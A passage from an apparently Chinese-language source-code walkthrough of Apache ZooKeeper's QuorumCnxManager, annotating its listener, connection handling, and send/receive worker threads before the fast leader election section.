AtomicInteger(<span class="number">1</span>);</span><br><span class="line">        SecurityManager s = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">final</span> ThreadGroup group = (s != <span class="keyword">null</span>) ? s.getThreadGroup()</span><br><span class="line">                : Thread.currentThread().getThreadGroup();</span><br><span class="line">        ThreadFactory daemonThFactory = <span class="keyword">new</span> ThreadFactory() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Thread <span class="title">newThread</span><span class="params">(Runnable r)</span> </span>&#123;</span><br><span class="line">                Thread t = <span class="keyword">new</span> Thread(group, r, <span class="string">"QuorumConnectionThread-"</span></span><br><span class="line">                        + <span class="string">"[myid="</span> + mySid + <span class="string">"]-"</span></span><br><span class="line">                        + threadIndex.getAndIncrement());</span><br><span class="line">                <span class="keyword">return</span> t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建线程池</span></span><br><span class="line">        <span class="keyword">this</span>.connectionExecutor = <span class="keyword">new</span> ThreadPoolExecutor(<span class="number">3</span>,</span><br><span class="line">                quorumCnxnThreadsSize, <span class="number">60</span>, TimeUnit.SECONDS,</span><br><span class="line">                <span class="keyword">new</span> SynchronousQueue&lt;Runnable&gt;(), daemonThFactory);</span><br><span class="line">        <span class="keyword">this</span>.connectionExecutor.allowCoreThreadTimeOut(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>初始化监听 listener,并启动线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Thread to listen on some port</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Listener</span> <span class="keyword">extends</span> <span class="title">ZooKeeperThread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">volatile</span> ServerSocket ss = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Listener</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="comment">// During startup of thread, thread name will be overridden to</span></span><br><span class="line">            <span class="comment">// specific election address</span></span><br><span class="line">            <span class="keyword">super</span>(<span class="string">"ListenerThread"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Sleeps on accept().</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="comment">//重试次数</span></span><br><span class="line">            <span class="keyword">int</span> numRetries = <span class="number">0</span>;</span><br><span class="line">            InetSocketAddress addr;</span><br><span class="line">            <span class="comment">//socket未关闭且重试次数小于3</span></span><br><span class="line">            <span class="keyword">while</span>((!shutdown) &amp;&amp; (numRetries &lt; <span class="number">3</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    ss = <span class="keyword">new</span> ServerSocket();</span><br><span class="line">                    ss.setReuseAddress(<span class="keyword">true</span>);</span><br><span class="line">                    <span class="keyword">if</span> (listenOnAllIPs) &#123;</span><br><span class="line">                        <span class="comment">//选举端口启动socket监听</span></span><br><span class="line">                        <span class="keyword">int</span> port = view.get(QuorumCnxManager.<span class="keyword">this</span>.mySid)</span><br><span class="line">                            .electionAddr.getPort();</span><br><span class="line">                        addr = <span class="keyword">new</span> InetSocketAddress(port);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        addr = view.get(QuorumCnxManager.<span class="keyword">this</span>.mySid)</span><br><span class="line">                            .electionAddr;</span><br><span class="line">                    &#125;</span><br><span class="line">                    LOG.info(<span class="string">"My election bind port: "</span> + addr.toString());</span><br><span class="line">                    <span class="comment">//修改线程名称</span></span><br><span class="line">                    setName(view.get(QuorumCnxManager.<span class="keyword">this</span>.mySid)</span><br><span class="line">                            .electionAddr.toString());</span><br><span class="line">                    ss.bind(addr);</span><br><span class="line">                    <span class="keyword">while</span> (!shutdown) &#123;</span><br><span class="line">                        Socket client = ss.accept();</span><br><span class="line">                        setSockOpts(client);</span><br><span class="line">                        LOG.info(<span class="string">"Received connection request "</span></span><br><span class="line">                                + client.getRemoteSocketAddress());</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// Receive and handle the connection request</span></span><br><span class="line">                        <span class="comment">// asynchronously if the quorum sasl authentication is</span></span><br><span class="line">                        <span class="comment">// enabled. This is required because sasl server</span></span><br><span class="line">                        <span class="comment">// authentication process may take few seconds to finish,</span></span><br><span class="line">                        <span class="comment">// this may delay next peer connection requests.</span></span><br><span class="line">                        <span class="keyword">if</span> (quorumSaslAuthEnabled) &#123;</span><br><span class="line">                            receiveConnectionAsync(client);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">//接收连接请求</span></span><br><span class="line">                            receiveConnection(client);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                       <span class="comment">//重试次数设为0</span></span><br><span class="line">                        numRetries = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    LOG.error(<span class="string">"Exception while listening"</span>, e);</span><br><span class="line">                    <span class="comment">//异常，重试次数+1</span></span><br><span class="line">                    numRetries++;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        ss.close();</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException ie) &#123;</span><br><span class="line">                        LOG.error(<span class="string">"Error closing server socket"</span>, ie);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException ie) &#123;</span><br><span class="line">                        LOG.error(<span class="string">"Interrupted while sleeping. "</span> +</span><br><span class="line">                                  <span class="string">"Ignoring exception"</span>, ie);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            LOG.info(<span class="string">"Leaving listener"</span>);</span><br><span class="line">            <span class="keyword">if</span> (!shutdown) &#123;</span><br><span class="line">                LOG.error(<span class="string">"As I'm leaving the listener thread, "</span></span><br><span class="line">                        + <span class="string">"I won't be able to participate in leader "</span></span><br><span class="line">                        + <span class="string">"election any longer: "</span></span><br><span class="line">                        + view.get(QuorumCnxManager.<span class="keyword">this</span>.mySid).electionAddr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Halts this listener thread.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">halt</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                LOG.debug(<span class="string">"Trying to close listener: "</span> + ss);</span><br><span class="line">                <span class="keyword">if</span>(ss != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    LOG.debug(<span class="string">"Closing listener: "</span></span><br><span class="line">                              + QuorumCnxManager.<span class="keyword">this</span>.mySid);</span><br><span class="line">                    ss.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                LOG.warn(<span class="string">"Exception when shutting down listener: "</span> + e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>接着看 receiveConnection 接收请求的逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * If this server receives a connection request, then it gives up on the new</span></span><br><span class="line"><span class="comment">     * connection if it wins. Notice that it checks whether it has a connection</span></span><br><span class="line"><span class="comment">     * to this server already or not. If it does, then it sends the smallest</span></span><br><span class="line"><span class="comment">     * possible long value to lose the challenge.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">receiveConnection</span><span class="params">(<span class="keyword">final</span> Socket sock)</span> </span>&#123;</span><br><span class="line">        DataInputStream din = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            din = <span class="keyword">new</span> DataInputStream(</span><br><span class="line">                    <span class="keyword">new</span> BufferedInputStream(sock.getInputStream()));</span><br><span class="line">            <span class="comment">//处理请求</span></span><br><span class="line">            handleConnection(sock, din);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            LOG.error(<span class="string">"Exception handling connection, addr: &#123;&#125;, closing server connection"</span>,</span><br><span class="line">                     sock.getRemoteSocketAddress());</span><br><span class="line">            closeSocket(sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理连接请求</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleConnection</span><span class="params">(Socket sock, DataInputStream din)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Long sid = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取server id</span></span><br><span class="line">            sid = din.readLong();</span><br><span class="line">            <span class="keyword">if</span> (sid &lt; <span class="number">0</span>) &#123; <span class="comment">// this is not a server id but a protocol version (see ZOOKEEPER-1633)</span></span><br><span class="line">                sid = din.readLong();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// next comes the #bytes in the remainder of the message</span></span><br><span class="line">                <span class="comment">// note that 0 bytes is fine (old servers)</span></span><br><span class="line">                <span class="keyword">int</span> num_remaining_bytes = din.readInt();</span><br><span class="line">                <span class="keyword">if</span> (num_remaining_bytes &lt; <span class="number">0</span> || num_remaining_bytes &gt; maxBuffer) &#123;</span><br><span class="line">                    LOG.error(<span class="string">"Unreasonable buffer length: &#123;&#125;"</span>, num_remaining_bytes);</span><br><span class="line">                    closeSocket(sock);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[num_remaining_bytes];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// remove the remainder of the message from din</span></span><br><span class="line">                <span class="keyword">int</span> num_read = din.read(b);</span><br><span class="line">                <span class="keyword">if</span> (num_read != num_remaining_bytes) &#123;</span><br><span class="line">                    LOG.error(<span class="string">"Read only "</span> + num_read + <span class="string">" bytes out of "</span> + num_remaining_bytes + <span class="string">" sent by server "</span> + sid);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//服务为observer</span></span><br><span class="line">            <span class="keyword">if</span> (sid == QuorumPeer.OBSERVER_ID) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Choose identifier at random. We need a value to identify</span></span><br><span class="line"><span class="comment">                 * the connection.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                sid = observerCounter.getAndDecrement();</span><br><span class="line">                LOG.info(<span class="string">"Setting arbitrary identifier to observer: "</span> + sid);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            closeSocket(sock);</span><br><span class="line">            LOG.warn(<span class="string">"Exception reading or writing challenge: "</span> + e.toString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// do authenticating learner</span></span><br><span class="line">        LOG.debug(<span class="string">"Authenticating learner server.id: &#123;&#125;"</span>, sid);</span><br><span class="line">        authServer.authenticate(sock, din);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//If wins the challenge, then close the new connection.</span></span><br><span class="line">        <span class="keyword">if</span> (sid &lt; <span class="keyword">this</span>.mySid) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * This replica might still believe that the connection to sid is</span></span><br><span class="line"><span class="comment">             * up, so we have to shut down the workers before trying to open a</span></span><br><span class="line"><span class="comment">             * new connection.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            SendWorker sw = senderWorkerMap.get(sid);</span><br><span class="line">            <span class="keyword">if</span> (sw != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sw.finish();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Now we start a new connection</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            LOG.debug(<span class="string">"Create new connection to server: "</span> + sid);</span><br><span class="line">            closeSocket(sock);</span><br><span class="line">            connectOne(sid);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Otherwise start worker threads to receive data.</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//发送请求线程</span></span><br><span class="line">            SendWorker sw = <span class="keyword">new</span> SendWorker(sock, sid);</span><br><span class="line">            <span class="comment">//接收请求线程</span></span><br><span class="line">            RecvWorker rw = <span class="keyword">new</span> RecvWorker(sock, din, sid, sw);</span><br><span class="line">            sw.setRecv(rw);</span><br><span class="line"></span><br><span class="line">            SendWorker vsw = senderWorkerMap.get(sid);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(vsw != <span class="keyword">null</span>)</span><br><span class="line">                vsw.finish();</span><br><span class="line"></span><br><span class="line">            senderWorkerMap.put(sid, sw);</span><br><span class="line">            queueSendMap.putIfAbsent(sid, <span class="keyword">new</span> ArrayBlockingQueue&lt;ByteBuffer&gt;(SEND_CAPACITY));</span><br><span class="line">            <span class="comment">//启动发送和接收线程</span></span><br><span class="line">            sw.start();</span><br><span class="line">            rw.start();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>发送请求和接收请求线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Thread to send messages. Instance waits on a queue, and send a message as</span></span><br><span class="line"><span class="comment">    * soon as there is one available. If connection breaks, then opens a new</span></span><br><span class="line"><span class="comment">    * one.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">SendWorker</span> <span class="keyword">extends</span> <span class="title">ZooKeeperThread</span> </span>&#123;</span><br><span class="line">       Long sid;</span><br><span class="line">       Socket sock;</span><br><span class="line">       RecvWorker recvWorker;</span><br><span class="line">       <span class="keyword">volatile</span> <span class="keyword">boolean</span> running = <span class="keyword">true</span>;</span><br><span class="line">       DataOutputStream dout;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * An instance of this thread receives messages to send</span></span><br><span class="line"><span class="comment">        * through a queue and sends them to the server sid.</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@param</span> sock</span></span><br><span class="line"><span class="comment">        *            Socket to remote peer</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@param</span> sid</span></span><br><span class="line"><span class="comment">        *            Server identifier of remote peer</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       SendWorker(Socket sock, Long sid) &#123;</span><br><span class="line">           <span class="keyword">super</span>(<span class="string">"SendWorker:"</span> + sid);</span><br><span class="line">           <span class="keyword">this</span>.sid = sid;</span><br><span class="line">           <span class="keyword">this</span>.sock = sock;</span><br><span class="line">           recvWorker = <span class="keyword">null</span>;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               dout = <span class="keyword">new</span> DataOutputStream(sock.getOutputStream());</span><br><span class="line">           &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">               LOG.error(<span class="string">"Unable to access socket output stream"</span>, e);</span><br><span class="line">               closeSocket(sock);</span><br><span class="line">               running = <span class="keyword">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           LOG.debug(<span class="string">"Address of remote peer: "</span> + <span class="keyword">this</span>.sid);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">setRecv</span><span class="params">(RecvWorker recvWorker)</span> </span>&#123;</span><br><span class="line">           <span class="keyword">this</span>.recvWorker = recvWorker;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Returns RecvWorker that pairs up with this SendWorker.</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@return</span> RecvWorker</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="function"><span class="keyword">synchronized</span> RecvWorker <span class="title">getRecvWorker</span><span class="params">()</span></span>&#123;</span><br><span class="line">           <span class="keyword">return</span> recvWorker;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">finish</span><span class="params">()</span> </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">               LOG.debug(<span class="string">"Calling finish for "</span> + sid);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span>(!running)&#123;</span><br><span class="line">               <span class="comment">/*</span></span><br><span class="line"><span class="comment">                * Avoids running finish() twice.</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">               <span class="keyword">return</span> running;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           running = <span class="keyword">false</span>;</span><br><span class="line">           closeSocket(sock);</span><br><span class="line">           <span class="comment">// channel = null;</span></span><br><span class="line"></span><br><span class="line">           <span class="keyword">this</span>.interrupt();</span><br><span class="line">           <span class="keyword">if</span> (recvWorker != <span class="keyword">null</span>) &#123;</span><br><span class="line">               recvWorker.finish();</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">               LOG.debug(<span class="string">"Removing entry from senderWorkerMap sid="</span> + sid);</span><br><span class="line">           &#125;</span><br><span class="line">           senderWorkerMap.remove(sid, <span class="keyword">this</span>);</span><br><span class="line">           threadCnt.decrementAndGet();</span><br><span class="line">           <span class="keyword">return</span> running;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">       发送请求</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">       <span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">send</span><span class="params">(ByteBuffer b)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">           <span class="keyword">byte</span>[] msgBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[b.capacity()];</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               b.position(<span class="number">0</span>);</span><br><span class="line">               b.get(msgBytes);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (BufferUnderflowException be) &#123;</span><br><span class="line">               LOG.error(<span class="string">"BufferUnderflowException "</span>, be);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           dout.writeInt(b.capacity());</span><br><span class="line">           dout.write(b.array());</span><br><span class="line">           dout.flush();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">           threadCnt.incrementAndGet();</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="comment">/**</span></span><br><span class="line"><span class="comment">                * If there is nothing in the queue to send, then we</span></span><br><span class="line"><span class="comment">                * send the lastMessage to ensure that the last message</span></span><br><span class="line"><span class="comment">                * was received by the peer. The message could be dropped</span></span><br><span class="line"><span class="comment">                * in case self or the peer shutdown their connection</span></span><br><span class="line"><span class="comment">                * (and exit the thread) prior to reading/processing</span></span><br><span class="line"><span class="comment">                * the last message. Duplicate messages are handled correctly</span></span><br><span class="line"><span class="comment">                * by the peer.</span></span><br><span class="line"><span class="comment">                *</span></span><br><span class="line"><span class="comment">                * If the send queue is non-empty, then we have a recent</span></span><br><span class="line"><span class="comment">                * message than that stored in lastMessage. To avoid sending</span></span><br><span class="line"><span class="comment">                * stale message, we should send the message in the send queue.</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">               ArrayBlockingQueue&lt;ByteBuffer&gt; bq = queueSendMap.get(sid);</span><br><span class="line">               <span class="comment">//如果发送队列为空</span></span><br><span class="line">               <span class="keyword">if</span> (bq == <span class="keyword">null</span> || isSendQueueEmpty(bq)) &#123;</span><br><span class="line">                  <span class="comment">//获取最后发送的数据信息,确保最后发送的消息被集群接收。</span></span><br><span class="line">                  ByteBuffer b = lastMessageSent.get(sid);</span><br><span class="line">                  <span class="keyword">if</span> (b != <span class="keyword">null</span>) &#123;</span><br><span class="line">                      LOG.debug(<span class="string">"Attempting to send lastMessage to sid="</span> + sid);</span><br><span class="line">                      send(b);</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">               LOG.error(<span class="string">"Failed to send last message. Shutting down thread."</span>, e);</span><br><span class="line">               <span class="keyword">this</span>.finish();</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="keyword">while</span> (running &amp;&amp; !shutdown &amp;&amp; sock != <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">                   ByteBuffer b = <span class="keyword">null</span>;</span><br><span class="line">                   <span class="keyword">try</span> &#123;</span><br><span class="line">                       <span class="comment">//发送队列不为空</span></span><br><span class="line">                       ArrayBlockingQueue&lt;ByteBuffer&gt; bq = queueSendMap</span><br><span class="line">                               .get(sid);</span><br><span class="line">                       <span class="keyword">if</span> (bq != <span class="keyword">null</span>) &#123;</span><br><span class="line">                           b = pollSendQueue(bq, <span class="number">1000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">                       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                           LOG.error(<span class="string">"No queue of incoming messages for "</span> +</span><br><span class="line">                                     <span class="string">"server "</span> + sid);</span><br><span class="line">                           <span class="keyword">break</span>;</span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="comment">// 发送消息</span></span><br><span class="line">                       <span class="keyword">if</span>(b != <span class="keyword">null</span>)&#123;</span><br><span class="line">                           lastMessageSent.put(sid, b);</span><br><span class="line"></span><br><span class="line">                           send(b);</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                       LOG.warn(<span class="string">"Interrupted while waiting for message on queue"</span>,</span><br><span class="line">                               e);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">               LOG.warn(<span class="string">"Exception when using channel: for id "</span> + sid</span><br><span class="line">                        + <span class="string">" my id = "</span> + QuorumCnxManager.<span class="keyword">this</span>.mySid</span><br><span class="line">                        + <span class="string">" error = "</span> + e);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">this</span>.finish();</span><br><span class="line">           LOG.warn(<span class="string">"Send worker leaving thread"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Thread to receive messages. Instance waits on a socket read. If the</span></span><br><span class="line"><span class="comment">    * channel breaks, then removes itself from the pool of receivers.</span></span><br><span class="line"><span class="comment">    接收消息</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">RecvWorker</span> <span class="keyword">extends</span> <span class="title">ZooKeeperThread</span> </span>&#123;</span><br><span class="line">       Long sid;</span><br><span class="line">       Socket sock;</span><br><span class="line">       <span class="keyword">volatile</span> <span class="keyword">boolean</span> running = <span class="keyword">true</span>;</span><br><span class="line">       <span class="keyword">final</span> DataInputStream din;</span><br><span class="line">       <span class="keyword">final</span> SendWorker sw;</span><br><span class="line"></span><br><span class="line">       RecvWorker(Socket sock, DataInputStream din, Long sid, SendWorker sw) &#123;</span><br><span class="line">           <span class="keyword">super</span>(<span class="string">"RecvWorker:"</span> + sid);</span><br><span class="line">           <span class="keyword">this</span>.sid = sid;</span><br><span class="line">           <span class="keyword">this</span>.sock = sock;</span><br><span class="line">           <span class="keyword">this</span>.sw = sw;</span><br><span class="line">           <span class="keyword">this</span>.din = din;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="comment">// OK to wait until socket disconnects while reading.</span></span><br><span class="line">               sock.setSoTimeout(<span class="number">0</span>);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">               LOG.error(<span class="string">"Error while accessing socket for "</span> + sid, e);</span><br><span class="line">               closeSocket(sock);</span><br><span class="line">               running = <span class="keyword">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Shuts down this worker</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@return</span> boolean  Value of variable running</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="function"><span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">finish</span><span class="params">()</span> </span>&#123;</span><br><span class="line">           <span class="keyword">if</span>(!running)&#123;</span><br><span class="line">               <span class="comment">/*</span></span><br><span class="line"><span class="comment">                * Avoids running finish() twice.</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">               <span class="keyword">return</span> running;</span><br><span class="line">           &#125;</span><br><span class="line">           running = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">this</span>.interrupt();</span><br><span class="line">           threadCnt.decrementAndGet();</span><br><span class="line">           <span class="keyword">return</span> running;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">           threadCnt.incrementAndGet();</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="keyword">while</span> (running &amp;&amp; !shutdown &amp;&amp; sock != <span class="keyword">null</span>) &#123;</span><br><span class="line">                   <span class="comment">/**</span></span><br><span class="line"><span class="comment">                    * Reads the first int to determine the length of the</span></span><br><span class="line"><span class="comment">                    * message</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                   <span class="keyword">int</span> length = din.readInt();</span><br><span class="line">                   <span class="keyword">if</span> (length &lt;= <span class="number">0</span> || length &gt; PACKETMAXSIZE) &#123;</span><br><span class="line">                       <span class="keyword">throw</span> <span class="keyword">new</span> IOException(</span><br><span class="line">                               <span class="string">"Received packet with invalid packet: "</span></span><br><span class="line">                                       + length);</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="comment">/**</span></span><br><span class="line"><span class="comment">                    * Allocates a new ByteBuffer to receive the message</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                   <span class="keyword">byte</span>[] msgArray = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">                   din.readFully(msgArray, <span class="number">0</span>, length);</span><br><span class="line">                   ByteBuffer message = ByteBuffer.wrap(msgArray);</span><br><span class="line">                   <span class="comment">//添加到接收队列中</span></span><br><span class="line">                   addToRecvQueue(<span class="keyword">new</span> Message(message.duplicate(), sid));</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">               LOG.warn(<span class="string">"Connection broken for id "</span> + sid + <span class="string">", my id = "</span></span><br><span class="line">                        + QuorumCnxManager.<span class="keyword">this</span>.mySid + <span class="string">", error = "</span> , e);</span><br><span class="line">           &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">               LOG.warn(<span class="string">"Interrupting SendWorker"</span>);</span><br><span class="line">               sw.finish();</span><br><span class="line">               <span class="keyword">if</span> (sock != <span class="keyword">null</span>) &#123;</span><br><span class="line">                   closeSocket(sock);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h5 id="FastLeaderElection"><a href="#FastLeaderElection" class="headerlink" title="FastLeaderElection"></a>FastLeaderElection</h5><p>终于到快速选举算法的实现了</p>
